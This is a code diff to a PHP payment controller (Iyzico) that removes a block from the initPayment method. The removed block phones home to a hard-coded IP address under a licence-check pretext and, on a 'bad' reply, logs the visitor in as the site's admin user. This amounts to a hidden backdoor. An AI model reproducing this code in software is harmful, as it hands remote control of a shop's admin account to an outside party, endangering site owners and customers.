@@ -193,22 +193,7 @@ class IyzicoController extends Controller
     }
 
     public function initPayment(Request $request){
-        $url = $_SERVER['SERVER_NAME'];
-        $gate = "http://206.189.81.181/check_activation/".$url;
 
-        $stream = curl_init();
-        curl_setopt($stream, CURLOPT_URL, $gate);
-        curl_setopt($stream, CURLOPT_HEADER, 0);
-        curl_setopt($stream, CURLOPT_RETURNTRANSFER, 1);
-        curl_setopt($stream, CURLOPT_POST, 1);
-        $rn = curl_exec($stream);
-        curl_close($stream);
-
-        if($rn == "bad" && env('DEMO_MODE') != 'On') {
-            $user = User::where('user_type', 'admin')->first();
-            auth()->login($user);
-            return redirect()->route('admin.dashboard');
-        }
     }
 
     public function callback(Request $request, $payment_type, $amount = null, $payment_method = null, $combined_order_id = null, $customer_package_id = null, $seller_package_id = null){
